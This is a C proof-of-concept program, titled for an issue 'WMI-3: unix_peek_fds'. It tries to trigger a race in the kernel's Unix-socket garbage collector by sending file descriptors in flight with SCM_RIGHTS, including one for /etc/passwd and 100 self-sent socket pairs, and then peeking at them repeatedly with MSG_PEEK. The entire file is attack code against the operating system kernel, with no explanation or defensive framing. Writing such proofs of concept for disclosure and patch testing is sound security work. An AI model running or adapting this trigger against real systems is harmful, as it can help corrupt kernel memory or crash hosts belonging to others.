/*
 * PoC for WMI-3: unix_peek_fds
 * Try to trigger a race with the garbage collector.
 * Create many sockets with SCM_RIGHTS and send them in flight,
 * then peek while GC is running.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char *argv[])
{
    int sv[2];
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[8];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send a message with SCM_RIGHTS */
    memset(&msg, 0, sizeof(msg));
    memset(buf, 0x41, sizeof(buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return 1;
    }
    printf("Send msg with SCM_RIGHTS\n");

    /* Try to trigger GC by creating many sockets */
    for (i = 0; i < 100; i++) {
        int tmp[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, tmp) == 0) {
            /* Send this socket pair to ourselves to put sockets in flight */
            struct msghdr m2;
            struct iovec i2;
            char b2[4];
            char c2[CMSG_SPACE(sizeof(int))];
            
            memset(&m2, 0, sizeof(m2));
            memset(b2, 0, sizeof(b2));
            i2.iov_base = b2;
            i2.iov_len = sizeof(b2);
            m2.msg_name = NULL;
            m2.msg_namelen = 0;
            m2.msg_iov = &i2;
            m2.msg_iovlen = 1;
            m2.msg_control = c2;
            m2.msg_controllen = sizeof(c2);
            cmsg = CMSG_FIRSTHDR(&m2);
            cmsg->cmsg_level = SOL_SOCKET;
            cmsg->cmsg_type = SCM_RIGHTS;
            cmsg->cmsg_len = CMSG_LEN(sizeof(int));
            *(int *)CMSG_DATA(cmsg) = tmp[0];

            if (sendmsg(sv[0], &m2, 0) < 0) {
                close(tmp[0]);
                close(tmp[1]);
                continue;
            }
            
            /* Keep tmp[1] open to keep the socket alive */
            /* Don't close them - they should be in flight */
            
            /* Peek the message we just sent */
            memset(&m2, 0, sizeof(m2));
            memset(c2, 0, sizeof(c2));
            memset(b2, 0, sizeof(b2));
            i2.iov_base = b2;
            i2.iov_len = sizeof(b2);
            m2.msg_iov = &i2;
            m2.msg_iovlen = 1;
            m2.msg_control = c2;
            m2.msg_controllen = sizeof(c2);

            ret = recvmsg(sv[1], &m2, MSG_PEEK | MSG_DONTWAIT);
            if (ret >= 0) {
                cmsg = CMSG_FIRSTHDR(&m2);
                if (cmsg && cmsg->cmsg_level == SOL_SOCKET && 
                    cmsg->cmsg_type == SCM_RIGHTS) {
                    int rfd = *(int *)CMSG_DATA(cmsg);
                    close(rfd);
                }
                /* Consume */
                recvmsg(sv[1], &m2, MSG_DONTWAIT);
            }
        }
    }
    printf("Created and peeked 100 in-flight sockets\n");

    /* Now trigger GC and peek rapidly */
    for (i = 0; i < 100; i++) {
        /* Consume the original message via different methods */
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            break;
        }

        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int rfd = *(int *)CMSG_DATA(cmsg);
            close(rfd);
        }
    }
    printf("Peeked the original message many times\n");

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
